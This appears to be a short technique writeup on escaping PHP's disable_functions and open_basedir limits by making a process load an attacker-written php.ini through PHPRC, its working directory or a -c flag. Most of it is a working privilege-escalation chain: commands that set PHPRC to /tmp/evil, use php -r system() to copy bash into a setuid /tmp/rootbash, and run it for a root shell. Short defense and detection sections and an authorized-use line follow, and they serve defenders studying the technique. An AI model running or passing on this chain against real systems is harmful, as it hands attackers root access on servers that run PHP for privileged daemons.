# disable_functions is config, not a wall

Full writeup: [jperezduerto.info/techniques/php-disable-functions-ini-bypass](https://jperezduerto.info/techniques/php-disable-functions-ini-bypass/)

`disable_functions`/`open_basedir` live in `php.ini`, not the code. If you can
influence how a PHP process starts (its `PHPRC` env, its working directory, or a
`-c` flag) you make it load a `php.ini` you wrote with the restrictions removed,
and `system`/`exec` come back. Most dangerous against a root daemon that runs
PHP on a file or field you submit. `evil.ini` is the payload config.

## Confirm it is config

```php
echo ini_get('disable_functions');
```

## Own the php.ini

```bash
export PHPRC=/tmp/evil            # PHP reads /tmp/evil/php.ini (see evil.ini here)
# or drop php.ini in the script CWD, or: php -c /tmp/evil/php.ini
php -r 'system("cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash");'
/tmp/rootbash -p                  # euid 0
```

Use SUID bash, not a bare interactive shell: a daemon has no tty, but the SUID
bit survives. `PHPRC` only helps if you can set the target's env or CWD; a plain
mod_php webshell cannot reset its own ini this way.

## Defense

`disable_functions` is a speed bump, not a sandbox: isolate with a low-priv
user / container / seccomp. Never run a privileged daemon that evaluates
user-supplied PHP; if you must, run it non-root with a `nosuid` workspace and
dropped capabilities. Pin the config: clear `PHPRC`, fixed CWD, explicit
`-c /etc/php/trusted.ini`.

## Detection

PHP running `system`/`exec` despite a configured `disable_functions`; a daemon
env with `PHPRC` in a writable path; `php -c` on a temp dir; a new SUID bash
after PHP ran.

## Use

Authorized and educational use only: your own systems, a lab you control, or an
engagement with written permission.
